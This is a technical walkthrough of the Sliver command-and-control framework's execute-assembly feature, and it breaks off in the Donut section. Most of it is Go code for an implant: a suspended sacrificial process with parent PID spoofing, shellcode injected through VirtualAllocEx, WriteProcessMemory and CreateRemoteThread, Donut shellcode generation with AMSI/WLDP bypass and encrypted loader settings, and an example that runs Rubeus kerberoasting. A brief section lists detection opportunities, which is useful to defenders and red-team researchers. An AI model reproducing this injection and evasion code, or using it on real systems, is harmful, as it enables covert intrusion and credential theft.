# ExecuteAssembly Sacrificial Process: Output Capture Implementation

## Overview

This document explains how Sliver's `ExecuteAssembly` functionality handles out-of-process (sacrificial process) execution and captures output from executed .NET assemblies. While there is no single function called "ExecuteAssemblySacrificialProcess," this represents the out-of-process execution path of the assembly execution feature.

## Architecture Overview

```
Client → Server (RPC) → Implant → Sacrificial Process → Output Buffers → Response Chain
```

### Two Execution Modes

1. **Out-of-Process (Sacrificial Process)** - Spawns a separate process and injects shellcode
2. **In-Process (CLR)** - Loads assembly directly into the implant's CLR runtime

This document focuses on the **out-of-process** approach.

---

## Implementation Components

### 1. Server-Side RPC Handler

**File:** `server/rpc/rpc-tasks.go:175-238`

```go
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {

    // Convert .NET assembly to Donut shellcode
    shellcode, err := generate.DonutFromAssembly(
        req.Assembly,
        req.IsDLL,
        req.Arch,
        strings.Join(req.Arguments, " "),
        req.Method,
        req.ClassName,
        req.AppDomain,
    )

    resp := &sliverpb.ExecuteAssembly{Response: &commonpb.Response{}}

    if req.InProcess {
        // Route to in-process CLR execution
        invokeInProcExecAssembly := &sliverpb.InvokeInProcExecuteAssemblyReq{...}
        err = rpc.GenericHandler(invokeInProcExecAssembly, resp)
    } else {
        // Route to out-of-process (sacrificial) execution
        invokeExecAssembly := &sliverpb.InvokeExecuteAssemblyReq{
            Data:        shellcode,  // Donut-wrapped assembly
            Process:     req.Process,
            PPid:        req.PPid,
            ProcessArgs: req.ProcessArgs,
            Request:     req.Request,
        }
        err = rpc.GenericHandler(invokeExecAssembly, resp)
    }

    return resp, nil
}
```

**Key Responsibilities:**
- Converts .NET assembly to position-independent shellcode using Donut
- Routes requests to appropriate execution mode (in-process vs out-of-process)
- Wraps response in protobuf message structure

### 2. Implant Handler

**File:** `implant/sliver/handlers/handlers_windows.go:303-322`

```go
func executeAssemblyHandler(data []byte, resp RPCResponse) {
    invokeReq := &sliverpb.InvokeExecuteAssemblyReq{}
    err := proto.Unmarshal(data, invokeReq)

    // Call task runner to execute assembly
    output, err := taskrunner.ExecuteAssembly(
        invokeReq.Data,        // Donut shellcode
        invokeReq.Process,     // Sacrificial process name
        invokeReq.ProcessArgs, // Process arguments
        invokeReq.PPid,        // Parent PID for spoofing
    )

    // Marshal response with captured output
    invokeResp := &sliverpb.ExecuteAssembly{
        Output: []byte(output),
    }
    data, err = proto.Marshal(invokeResp)
    resp(data, err)
}
```

**Handler Registration:**
```go
windowsHandlers = map[uint32]RPCHandler{
    sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
    // ...
}
```

### 3. Task Runner - Out-of-Process Execution

**File:** `implant/sliver/taskrunner/task_windows.go:289-335`

This is the core implementation of sacrificial process execution:

```go
func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
    // Create buffers to capture stdout and stderr
    var stdoutBuf, stderrBuf bytes.Buffer

    // Start sacrificial process with output redirection
    cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true)
    if err != nil {
        return "", err
    }

    // Get handle to the process
    handle, err := syscall.OpenProcess(syscall.PROCESS_DUP_HANDLE, true, uint32(cmd.Process.Pid))
    if err != nil {
        return "", err
    }
    defer syscall.CloseHandle(handle)

    // Duplicate handle for injection
    var lpTargetHandle syscall.Handle
    currentProcess, _ := syscall.GetCurrentProcess()
    err = syscall.DuplicateHandle(
        handle,
        currentProcess,
        currentProcess,
        &lpTargetHandle,
        0,
        false,
        syscall.DUPLICATE_SAME_ACCESS,
    )
    if err != nil {
        return "", err
    }

    // Inject shellcode into the process
    threadHandle, err := injectTask(lpTargetHandle, data, false)
    if err != nil {
        return "", err
    }

    // Wait for shellcode execution to complete
    err = waitForCompletion(threadHandle)
    syscall.CloseHandle(threadHandle)

    // Kill the sacrificial process
    err = cmd.Process.Kill()

    // Return captured output (stdout + stderr concatenated)
    return stdoutBuf.String() + stderrBuf.String(), nil
}
```

### 4. Process Creation with Output Redirection

**File:** `implant/sliver/taskrunner/task_windows.go:438-469`

```go
func startProcess(proc string, args []string, ppid uint32, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {

    cmd := exec.Command(proc, args...)

    // Attach output buffers to process
    cmd.Stdout = stdout  // Redirect stdout to buffer
    cmd.Stderr = stderr  // Redirect stderr to buffer

    // Windows-specific process attributes
    cmd.SysProcAttr = &windows.SysProcAttr{
        Token: syscall.Token(token),
    }

    if suspended {
        // Create process in suspended state (no execution yet)
        cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
    }

    if ppid != 0 {
        // Spoof parent process ID
        cmd.SysProcAttr.ParentProcess = parentHandle
    }

    // Start the process
    cmd.Start()

    return cmd, nil
}
```

**How Output Capture Works:**
- Go's `exec.Cmd` automatically redirects process stdout/stderr to the provided `bytes.Buffer` objects
- The buffers are **in-memory** and accumulate all output from the sacrificial process
- This happens transparently through standard Windows pipe mechanisms
- No additional code is needed to read from pipes - Go handles this internally

### 5. Shellcode Injection

**File:** `implant/sliver/taskrunner/task_windows.go:68-134`

```go
func injectTask(process syscall.Handle, data []byte, rwxPages bool) (syscall.Handle, error) {

    // Allocate memory in remote process
    addr, err := windows.VirtualAllocEx(
        windows.Handle(process),
        0,
        uintptr(len(data)),
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    )
    if err != nil {
        return syscall.InvalidHandle, err
    }

    // Write shellcode to allocated memory
    err = windows.WriteProcessMemory(
        windows.Handle(process),
        addr,
        &data[0],
        uintptr(len(data)),
        nil,
    )
    if err != nil {
        return syscall.InvalidHandle, err
    }

    // Change memory protection to executable
    var oldProtect uint32
    err = windows.VirtualProtectEx(
        windows.Handle(process),
        addr,
        uintptr(len(data)),
        windows.PAGE_EXECUTE_READ,
        &oldProtect,
    )
    if err != nil {
        return syscall.InvalidHandle, err
    }

    // Create remote thread to execute shellcode
    threadHandle, err := windows.CreateRemoteThread(
        windows.Handle(process),
        nil,
        0,
        addr,
        0,
        0,
        nil,
    )

    return syscall.Handle(threadHandle), err
}
```

### 6. Thread Completion Polling

**File:** `implant/sliver/taskrunner/task_windows.go:136-149`

```go
func waitForCompletion(threadHandle syscall.Handle) error {
    for {
        var exitCode uint32
        err := syscall.GetExitCodeThread(threadHandle, &exitCode)
        if err != nil && !errors.Is(err, windows.ERROR_INVALID_HANDLE) {
            return err
        }

        // STILL_ACTIVE = 259
        if exitCode != uintptr(259) {
            break
        }

        time.Sleep(1 * time.Second)
    }
    return nil
}
```

---

## Protobuf Message Flow

### Request Message (Client → Server)

**File:** `protobuf/sliverpb/sliver.proto:454-495`

```protobuf
message ExecuteAssemblyReq {
  bytes Assembly = 1;                    // Raw .NET assembly bytes
  repeated string Arguments = 2;         // Command-line arguments
  string Process = 3;                    // Sacrificial process (e.g., "notepad.exe")
  bool IsDLL = 4;                        // Assembly type
  string Arch = 5;                       // "x86" or "x64"
  string ClassName = 6;                  // For DLL: namespace.ClassName
  string Method = 7;                     // For DLL: method name
  string AppDomain = 8;                  // .NET AppDomain name
  uint32 PPid = 10;                      // Parent process ID (for spoofing)
  repeated string ProcessArgs = 11;      // Arguments for sacrificial process
  bool InProcess = 12;                   // false = sacrificial, true = CLR
  string Runtime = 13;                   // CLR version (in-process only)
  bool AmsiBypass = 14;                  // AMSI bypass (in-process only)
  bool EtwBypass = 15;                   // ETW bypass (in-process only)
  commonpb.Request Request = 9;          // Session/Beacon metadata
}
```

### Internal Request Message (Server → Implant)

```protobuf
message InvokeExecuteAssemblyReq {
  bytes Data = 1;                        // Donut shellcode
  string process = 2;                    // Sacrificial process name
  uint32 PPid = 10;                      // Parent PID
  repeated string ProcessArgs = 11;      // Process arguments
  commonpb.Request Request = 9;          // Session info
}
```

### Response Message (Implant → Server → Client)

```protobuf
message ExecuteAssembly {
  bytes Output = 1;                      // Captured stdout + stderr
  commonpb.Response Response = 9;        // Status and error info
}
```

### Service Definition

**File:** `protobuf/rpcpb/services.proto:191-192`

```protobuf
service SliverRPC {
  rpc ExecuteAssembly(sliverpb.ExecuteAssemblyReq)
      returns (sliverpb.ExecuteAssembly);
}
```

---

## Complete Execution Flow

### Step-by-Step Process

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. CLIENT COMMAND                                               │
│    execute-assembly /path/to/assembly.exe arg1 arg2             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 2. SERVER RPC HANDLER (rpc-tasks.go)                            │
│    • Reads assembly bytes                                       │
│    • Converts to Donut shellcode                                │
│    • Creates InvokeExecuteAssemblyReq                           │
│    • Sends to implant                                           │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 3. IMPLANT HANDLER (handlers_windows.go)                        │
│    • Receives InvokeExecuteAssemblyReq                          │
│    • Unmarshals protobuf                                        │
│    • Calls taskrunner.ExecuteAssembly()                         │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 4. TASK RUNNER (task_windows.go)                                │
│    • Creates bytes.Buffer for stdout/stderr                     │
│    • Calls startProcess() with buffers                          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 5. PROCESS CREATION (startProcess)                              │
│    • Creates exec.Cmd with sacrificial process                  │
│    • Attaches stdout/stderr buffers                             │
│    • Sets CREATE_SUSPENDED flag                                 │
│    • Optionally spoofs parent PID                               │
│    • Starts process (suspended, no code execution)              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 6. SHELLCODE INJECTION (injectTask)                             │
│    • OpenProcess() - Get handle to suspended process            │
│    • VirtualAllocEx() - Allocate RW memory in remote process    │
│    • WriteProcessMemory() - Write Donut shellcode               │
│    • VirtualProtectEx() - Change to PAGE_EXECUTE_READ           │
│    • CreateRemoteThread() - Resume execution at shellcode addr  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 7. EXECUTION IN SACRIFICIAL PROCESS                             │
│    • Donut loader unpacks .NET assembly                         │
│    • Loads CLR into process space                               │
│    • Invokes assembly entry point                               │
│    • Assembly executes with provided arguments                  │
│    • Console.WriteLine() → stdout pipe → stdoutBuf              │
│    • Console.Error.WriteLine() → stderr pipe → stderrBuf        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 8. COMPLETION POLLING (waitForCompletion)                       │
│    • Polls thread exit code via GetExitCodeThread()             │
│    • Waits until exitCode != STILL_ACTIVE (259)                 │
│    • Returns when thread completes                              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 9. CLEANUP AND OUTPUT CAPTURE                                   │
│    • cmd.Process.Kill() - Terminate sacrificial process         │
│    • stdoutBuf.String() + stderrBuf.String()                    │
│    • Return combined output string                              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 10. RESPONSE MARSHALING                                         │
│    • Create ExecuteAssembly protobuf message                    │
│    • Set Output field to captured output bytes                  │
│    • Marshal and send to server                                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ 11. CLIENT DISPLAY                                              │
│    • HandleExecuteAssemblyResponse() processes response         │
│    • Displays output to operator console                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## Output Capture Mechanism

### How Go's exec.Cmd Captures Output

When `cmd.Stdout` and `cmd.Stderr` are set to `bytes.Buffer` objects:

1. **Process Creation**: Windows creates pipes for the child process's stdout/stderr handles
2. **Handle Redirection**: Child process inherits pipe write ends as its stdout/stderr
3. **Background Reading**: Go runtime spawns goroutines to read from pipe read ends
4. **Buffer Writing**: Read data is written to the `bytes.Buffer` objects
5. **Automatic Management**: All pipe creation, reading, and cleanup is handled by Go

**No explicit code needed** - the assignment `cmd.Stdout = &stdoutBuf` triggers this entire mechanism.

### Windows API Layer

Behind the scenes, Go uses:
- `CreatePipe()` - Creates anonymous pipes for stdout/stderr
- `SetHandleInformation()` - Makes handles inheritable
- `CreateProcess()` - Spawns process with redirected handles
- Background goroutines read from pipes using `ReadFile()`

### Memory Flow

```
Assembly Output → Process stdout → Windows Pipe → Go Goroutine → bytes.Buffer → String → Protobuf
```

---

## Technical Details

### Windows API Calls Used

| API Function | Purpose | Location |
|--------------|---------|----------|
| `OpenProcess()` | Get handle to suspended process | task_windows.go:302 |
| `DuplicateHandle()` | Duplicate process handle | task_windows.go:308 |
| `VirtualAllocEx()` | Allocate memory in remote process | task_windows.go:80 |
| `WriteProcessMemory()` | Write shellcode to remote memory | task_windows.go:93 |
| `VirtualProtectEx()` | Change memory protection to RWX | task_windows.go:104 |
| `CreateRemoteThread()` | Execute shellcode in remote thread | task_windows.go:118 |
| `GetExitCodeThread()` | Poll thread completion status | task_windows.go:141 |
| `CreateProcess()` | Spawn sacrificial process | exec.Cmd (Go stdlib) |
| `SetStdHandle()` | Redirect console handles | exec.Cmd (Go stdlib) |

### Donut Shellcode Conversion

**Purpose**: Converts .NET assemblies to position-independent shellcode

**What Donut Does**:
1. Embeds the .NET assembly in shellcode
2. Includes a CLR loader stub
3. Handles runtime initialization
4. Invokes the assembly entry point
5. Supports both x86 and x64 architectures

**Server Generation**: `generate.DonutFromAssembly()` (called in rpc-tasks.go:186)

For complete details on Donut implementation, see the [Donut Implementation Deep Dive](#donut-implementation-deep-dive) section below.

### Parent Process ID Spoofing

When `PPid` is specified:
```go
if ppid != 0 {
    parentHandle, _ := syscall.OpenProcess(
        syscall.PROCESS_CREATE_PROCESS,
        false,
        ppid,
    )
    cmd.SysProcAttr.ParentProcess = parentHandle
}
```

This makes the sacrificial process appear as a child of a different parent (e.g., explorer.exe) for defense evasion.

---

## Comparison: Out-of-Process vs In-Process

| Aspect | Out-of-Process (Sacrificial) | In-Process (CLR) |
|--------|------------------------------|------------------|
| **File** | `task_windows.go` | `dotnet_windows.go` |
| **Process** | Separate process spawned | Runs in implant process |
| **Shellcode** | Donut-wrapped assembly | Native .NET bytes |
| **Output Capture** | `exec.Cmd` pipes → buffers | CLR API pipe redirection |
| **Execution** | CreateRemoteThread | CLR::InvokeAssembly |
| **Memory** | Remote process memory | Implant memory |
| **Cleanup** | Process.Kill() | None (in-memory) |
| **Caching** | None | SHA256-based assembly cache |
| **AMSI/ETW Bypass** | Not supported | Supported via patching |
| **Stealth** | More isolated, separate process | Higher risk (crashes implant) |
| **PPid Spoofing** | Supported | N/A |

---

## Key Implementation Files

| Component | File Path | Lines |
|-----------|-----------|-------|
| Server RPC | `server/rpc/rpc-tasks.go` | 175-238 |
| Implant Handler | `implant/sliver/handlers/handlers_windows.go` | 303-322 |
| Task Runner | `implant/sliver/taskrunner/task_windows.go` | 289-335 |
| Process Start | `implant/sliver/taskrunner/task_windows.go` | 438-469 |
| Injection | `implant/sliver/taskrunner/task_windows.go` | 68-134 |
| Completion Wait | `implant/sliver/taskrunner/task_windows.go` | 136-149 |
| Client Command | `client/command/exec/execute-assembly.go` | 35-132 |
| Protobuf Defs | `protobuf/sliverpb/sliver.proto` | 454-495 |
| Service Def | `protobuf/rpcpb/services.proto` | 191-192 |

---

## Security Considerations

### Defense Evasion Features

1. **Process Injection**: Avoids direct assembly execution
2. **Parent PID Spoofing**: Hides process relationship
3. **Memory Protection**: Uses RW → RX transition (not RWX)
4. **Process Cleanup**: Terminates sacrificial process immediately
5. **Donut Obfuscation**: Shellcode format evades static analysis

### Detection Opportunities

1. **CreateRemoteThread** calls (common EDR detection)
2. **VirtualAllocEx** + **WriteProcessMemory** patterns
3. **Suspended process creation** (CREATE_SUSPENDED flag)
4. **CLR loading** in unexpected processes (e.g., notepad.exe)
5. **Orphaned processes** (parent PID spoofing)

---

## Usage Example

### Client Command
```bash
sliver > execute-assembly --process notepad.exe --ppid 1234 /tmp/Rubeus.exe kerberoast
```

### Server Processing
1. Reads `Rubeus.exe` bytes
2. Converts to Donut shellcode (x64)
3. Creates `InvokeExecuteAssemblyReq` with shellcode
4. Sends to implant

### Implant Execution
1. Creates stdout/stderr buffers
2. Spawns `notepad.exe` (suspended, spoofed parent)
3. Injects Donut shellcode
4. CreateRemoteThread executes shellcode
5. Rubeus.exe runs, output captured to buffers
6. Polls thread completion
7. Kills notepad.exe
8. Returns captured output

### Output Returned
```
[*] Action: Kerberoasting

[*] Target Domain: CONTOSO.LOCAL
[*] Searching for accounts with SPN...
[*] Found 5 kerberoastable users

<Kerberos tickets>
```

---

## References

### Code References

- Process creation: `task_windows.go:438-469`
- Shellcode injection: `task_windows.go:68-134`
- Output capture: `task_windows.go:289-335`
- RPC handler: `rpc-tasks.go:175-238`
- Protobuf messages: `sliver.proto:454-495`

### Related Documentation

- Donut Shellcode Generator: https://github.com/TheWover/donut
- Windows Process Injection: https://attack.mitre.org/techniques/T1055/
- .NET Assembly Execution: https://attack.mitre.org/techniques/T1059/005/

---

## Summary

The "sacrificial process" execution method in Sliver's `ExecuteAssembly` feature:

1. **Spawns** a benign process (e.g., notepad.exe) in suspended state
2. **Redirects** stdout/stderr to in-memory buffers via Go's exec.Cmd
3. **Injects** Donut-wrapped .NET assembly as position-independent shellcode
4. **Executes** shellcode via CreateRemoteThread
5. **Captures** all console output to bytes.Buffer objects
6. **Waits** for thread completion via polling
7. **Terminates** the sacrificial process
8. **Returns** concatenated stdout+stderr output via protobuf

This provides **process isolation**, **defense evasion** (via parent PID spoofing), and **reliable output capture** without requiring complex IPC mechanisms.

---

# Donut Implementation Deep Dive

This section provides comprehensive details on how Donut shellcode generation is implemented and integrated into Sliver.

## Donut Overview

Donut is a shellcode generation tool that converts .NET assemblies, native PE files (EXE/DLL), VBScript, JScript, and XSL files into position-independent shellcode. In Sliver, Donut is used exclusively for converting .NET assemblies to shellcode for the sacrificial process execution method.

### Vendored Implementation

Donut is **fully vendored** into the Sliver codebase:
- **Location**: `vendor/github.com/Binject/go-donut/donut/`
- **Source**: https://github.com/Binject/go-donut (Go port of original Donut)
- **Language**: Pure Go implementation
- **Integration**: Server-side only (not embedded in implants)

**Vendored Files**:
```
vendor/github.com/Binject/go-donut/donut/
├── donut.go              # Main shellcode generation logic
├── donut_crypt.go        # Chaskey encryption + Maru hashing
├── types.go              # DonutConfig, DonutModule, DonutInstance
├── loader_exe_x86.go     # 32-bit assembly loader stub
├── loader_exe_x64.go     # 64-bit assembly loader stub
└── utils.go              # Random string/byte generation
```

---

## DonutFromAssembly Function

### Location and Signature

**File**: `server/generate/donut.go:67-86`

```go
func DonutFromAssembly(assembly []byte, isDLL bool, arch string,
                       params string, method string, className string,
                       appDomain string) ([]byte, error)
```

### Parameters

| Parameter | Type | Description | Example |
|-----------|------|-------------|---------|
| `assembly` | `[]byte` | Raw .NET assembly bytes | File contents of `Rubeus.exe` |
| `isDLL` | `bool` | Whether assembly is DLL (vs EXE) | `false` for EXE, `true` for DLL |
| `arch` | `string` | Target architecture | `"x64"`, `"x86"`, `"x84"` (both) |
| `params` | `string` | Command-line arguments | `"kerberoast /nowrap"` |
| `method` | `string` | Method to invoke (DLL only) | `"Main"` |
| `className` | `string` | Class name with namespace (DLL only) | `"MyNamespace.MyClass"` |
| `appDomain` | `string` | .NET AppDomain name | `"DefaultDomain"` |

### Implementation

```go
func DonutFromAssembly(assembly []byte, isDLL bool, arch string,
                       params string, method string, className string,
                       appDomain string) ([]byte, error) {

    // Determine file extension based on isDLL flag
    ext := ".exe"
    if isDLL {
        ext = ".dll"
    }

    // Convert architecture string to Donut constant
    donutArch := getDonutArch(arch)

    // Create configuration with default settings
    config := donut.DefaultConfig()

    // Sliver-specific configuration
    config.Bypass = 3                    // Continue on AMSI/WLDP bypass failure
    config.Runtime = "v4.0.30319"        // .NET 4.0 CLR (hardcoded)
    config.Format = 1                    // Output format: raw bytes
    config.Arch = donutArch              // Target architecture
    config.Class = className             // Class name (DLL only)
    config.Parameters = params           // Command-line arguments
    config.Domain = appDomain            // AppDomain name
    config.Method = method               // Method name (DLL only)
    config.Entropy = 3                   // Full entropy: encryption + random names
    config.Unicode = 0                   // Don't convert to Unicode
    config.Type = getDonutType(ext, true) // DONUT_MODULE_NET_DLL or NET_EXE

    // Generate shellcode
    return getDonut(assembly, config)
}
```

### Helper Functions

**Architecture Mapping** (`server/generate/donut.go:104-117`):
```go
func getDonutArch(arch string) donut.DonutArch {
    switch strings.ToLower(arch) {
    case "x32", "386":
        return donut.X32          // 32-bit only
    case "x64", "amd64":
        return donut.X64          // 64-bit only
    case "x84":
        return donut.X84          // Both (polyglot)
    default:
        return donut.X84          // Default to both
    }
}
```

**Module Type Determination** (`server/generate/donut.go:119-142`):
```go
func getDonutType(ext string, dotnet bool) donut.ModuleType {
    switch strings.ToLower(filepath.Ext(ext)) {
    case ".exe", ".bin":
        if dotnet {
            return donut.DONUT_MODULE_NET_EXE  // .NET executable
        }
        return donut.DONUT_MODULE_EXE           // Native PE
    case ".dll":
        if dotnet {
            return donut.DONUT_MODULE_NET_DLL  // .NET library
        }
        return donut.DONUT_MODULE_DLL           // Native DLL
    case ".xsl":
        return donut.DONUT_MODULE_XSL
    case ".js":
        return donut.DONUT_MODULE_JS
    case ".vbs":
        return donut.DONUT_MODULE_VBS
    default:
        return donut.ModuleType(0)
    }
}
```

**Shellcode Generation** (`server/generate/donut.go:88-102`):
```go
func getDonut(data []byte, config *donut.DonutConfig) ([]byte, error) {
    // Call vendored Donut library
    shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(data), config)
    if err != nil {
        return nil, err
    }

    // Add stack alignment prologue for x64
    // Ensures 16-byte alignment required by Windows x64 ABI
    prologue := []byte{
        0x48, 0x83, 0xE4, 0xF0,  // AND RSP, 0xFFFFFFFFFFFFFFF0
        0x48, 0x83, 0xC4, 0x08,  // ADD RSP, 8
    }

    result := append(prologue, shellcode.Bytes()...)
    return result, nil
}
```

---

## Donut Shellcode Generation Process

The conversion happens in three sequential stages within the vendored Donut library.

### Stage 1: Module Creation

**File**: `vendor/github.com/Binject/go-donut/donut/donut.go:167-238`

**Function**: `CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error`

**Purpose**: Creates a `DonutModule` structure containing the .NET assembly and metadata.

#### DonutModule Structure

**File**: `vendor/github.com/Binject/go-donut/donut/types.go:112-129`

```go
type DonutModule struct {
    ModType  uint32         // Module type (1=NET_DLL, 2=NET_EXE, 3=DLL, 4=EXE)
    Thread   uint32         // Execute as thread flag
    Compress uint32         // Compression engine (1=none, 2=LZNT1, etc.)

    Runtime  [256]byte      // .NET runtime version ("v4.0.30319")
    Domain   [256]byte      // .NET AppDomain name
    Cls      [256]byte      // Class name (DLL only)
    Method   [256]byte      // Method name (DLL only)
    Param    [256]byte      // Command-line parameters

    Unicode  uint32         // Unicode conversion flag
    Sig      [8]byte        // Decryption verification signature
    Mac      uint64         // Message authentication code
    Zlen     uint32         // Compressed size (0 if not compressed)
    Len      uint32         // Uncompressed size
    Data     [4]byte        // Start of payload data (variable length)
}
```

**Size**: ~1000 bytes + assembly size

#### Module Creation Process

```go
func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
    mod := new(DonutModule)

    // Set module type
    mod.ModType = uint32(config.Type)  // DONUT_MODULE_NET_EXE = 2
    mod.Thread = uint32(config.Thread)
    mod.Unicode = uint32(config.Unicode)
    mod.Compress = uint32(config.Compress)

    // For .NET assemblies
    if config.Type == DONUT_MODULE_NET_DLL || config.Type == DONUT_MODULE_NET_EXE {

        // Generate or use provided AppDomain name
        if config.Domain == "" && config.Entropy != DONUT_ENTROPY_NONE {
            config.Domain = RandomString(DONUT_DOMAIN_LEN)  // 8 characters
        } else if config.Domain == "" {
            config.Domain = "AAAAAAAA"  // Default debug name
        }
        copy(mod.Domain[:], []byte(config.Domain))

        // For DLLs: store class and method names
        if config.Type == DONUT_MODULE_NET_DLL {
            copy(mod.Cls[:], []byte(config.Class))
            copy(mod.Method[:], []byte(config.Method))
        }

        // Set CLR runtime version
        if config.Runtime == "" {
            config.Runtime = "v2.0.50727"  // .NET 2.0/3.5 default
        }
        copy(mod.Runtime[:], []byte(config.Runtime))
    }

    // Store assembly size
    mod.Zlen = 0                          // No compression
    mod.Len = uint32(inputFile.Len())     // Original assembly size

    // Store command-line parameters
    if config.Parameters != "" {
        copy(mod.Param[:], []byte(config.Parameters))
    }

    // Combine module header + assembly data
    b := new(bytes.Buffer)
    mod.WriteTo(b)           // Write DonutModule structure
    inputFile.WriteTo(b)     // Append raw .NET assembly bytes

    config.ModuleData = b    // Store combined data
    config.Module = mod

    return nil
}
```

**Output**: `DonutModule` header + raw .NET assembly bytes

---

### Stage 2: Instance Creation

**File**: `vendor/github.com/Binject/go-donut/donut/donut.go:241-487`

**Function**: `CreateInstance(config *DonutConfig) error`

**Purpose**: Creates a `DonutInstance` structure containing runtime configuration, encrypted API hashes, and the module data.

#### DonutInstance Structure

**File**: `vendor/github.com/Binject/go-donut/donut/types.go:154-223`

```go
type DonutInstance struct {
    Len      uint32         // Total instance size

    // Encryption keys (randomized if entropy enabled)
    KeyMk    [16]byte       // Master key for Chaskey cipher
    KeyCtr   [16]byte       // Counter/nonce for CTR mode

    // Hashing configuration
    Iv       uint64         // Initialization vector for Maru hash
    Hash     [64]uint64     // Pre-computed API hashes (64-bit each)

    // Runtime options
    ExitOpt  uint32         // Exit behavior (1=thread, 2=process)
    Entropy  uint32         // Entropy level (1=none, 2=random, 3=encrypt)
    OEP      uint64         // Original entry point

    // === ENCRYPTED SECTION BEGINS HERE ===

    ApiCount uint32         // Number of Windows APIs to resolve
    DllNames [256]byte      // DLL names (kernel32, ole32, mscoree)

    // Defense bypass strings
    Amsi     [8]byte        // "amsi" string
    Clr      [4]byte        // "clr" string
    Wldp     [8]byte        // "wldp" string (Windows Lockdown Policy)

    // .NET COM interface GUIDs
    XCLSID_CLRMetaHost      uuid.UUID  // CLR MetaHost CLSID
    XIID_ICLRMetaHost       uuid.UUID  // ICLRMetaHost interface IID
    XIID_ICLRRuntimeInfo    uuid.UUID  // ICLRRuntimeInfo interface IID
    XCLSID_CorRuntimeHost   uuid.UUID  // CorRuntimeHost CLSID
    XIID_ICorRuntimeHost    uuid.UUID  // ICorRuntimeHost interface IID
    XIID_AppDomain          uuid.UUID  // AppDomain interface IID
    // ... (12 total GUIDs for .NET initialization)

    // Module information
    Type     uint32         // 1=PIC (embedded), 2=URL (download)
    Mod_len  uint64         // Module size in bytes

    // Module data immediately follows this structure
}
```

**Size**: ~3600 bytes + module size

#### Instance Creation Process

```go
func CreateInstance(config *DonutConfig) error {
    inst := new(DonutInstance)

    // Calculate total instance size
    inst.Len = uint32(unsafe.Sizeof(DonutInstance{})) + uint32(config.ModuleData.Len())

    // === ENCRYPTION KEYS (if entropy enabled) ===
    if config.Entropy == DONUT_ENTROPY_DEFAULT {
        // Generate random 128-bit keys
        rand.Read(inst.KeyMk[:])
        rand.Read(inst.KeyCtr[:])
    }

    // === API HASHING ===
    // Generate random IV for Maru hash function
    binary.Read(rand.Reader, binary.LittleEndian, &inst.Iv)

    // Hash all 51 Windows API names using Maru with random IV
    for i, apiImport := range api_imports {
        apiName := apiImport.Module + apiImport.Name
        inst.Hash[i] = Maru([]byte(apiName), inst.Iv)
    }
    inst.ApiCount = uint32(len(api_imports))  // 51 APIs

    // === DEFENSE BYPASS STRINGS ===
    copy(inst.Amsi[:], []byte("amsi"))
    copy(inst.Clr[:], []byte("clr"))
    copy(inst.Wldp[:], []byte("wldp"))

    // === .NET COM GUIDs ===
    inst.XCLSID_CLRMetaHost = xCLSID_CLRMetaHost
    inst.XIID_ICLRMetaHost = xIID_ICLRMetaHost
    inst.XIID_ICLRRuntimeInfo = xIID_ICLRRuntimeInfo
    inst.XCLSID_CorRuntimeHost = xCLSID_CorRuntimeHost
    inst.XIID_ICorRuntimeHost = xIID_ICorRuntimeHost
    inst.XIID_AppDomain = xIID_AppDomain
    // ... (12 total GUIDs)

    // === MODULE CONFIGURATION ===
    inst.Type = DONUT_INSTANCE_PIC  // 1 = embedded module
    inst.Mod_len = uint64(config.ModuleData.Len())

    // === DLL NAMES ===
    dllNames := "kernel32;ole32;oleaut32;mscoree;msvcrt"
    copy(inst.DllNames[:], []byte(dllNames))

    // === ENCRYPTION (if enabled) ===
    if config.Entropy == DONUT_ENTROPY_DEFAULT {
        // Encrypt everything from ApiCount onwards
        encryptedSection := InstanceToByteSlice(inst)[offsetof_ApiCount:]
        encrypted := Encrypt(inst.KeyMk[:], inst.KeyCtr[:], encryptedSection)
        copy(encryptedSection, encrypted)
    }

    // Combine instance + module data
    b := new(bytes.Buffer)
    inst.WriteTo(b)                  // Write DonutInstance
    config.ModuleData.WriteTo(b)     // Append DonutModule + assembly

    config.inst = inst
    config.instLen = uint32(b.Len())

    return nil
}
```

**Output**: Encrypted `DonutInstance` + `DonutModule` + assembly bytes

---

### Stage 3: Sandwich Assembly

**File**: `vendor/github.com/Binject/go-donut/donut/donut.go:110-164`

**Function**: `Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error)`

**Purpose**: Wraps the instance with position-independent loader stubs and creates the final shellcode.

#### Shellcode Structure

```
[CALL instruction]  ; E8 - CALL $+5 (pushes return address = instance address)
[Instance Length]   ; 4 bytes, little-endian
[Instance Data]     ; DonutInstance + DonutModule + assembly
[POP ECX]          ; 59 - POP return address into ECX (instance address)
[Loader Stub]      ; Architecture-specific assembly code
```

#### Sandwich Implementation

```go
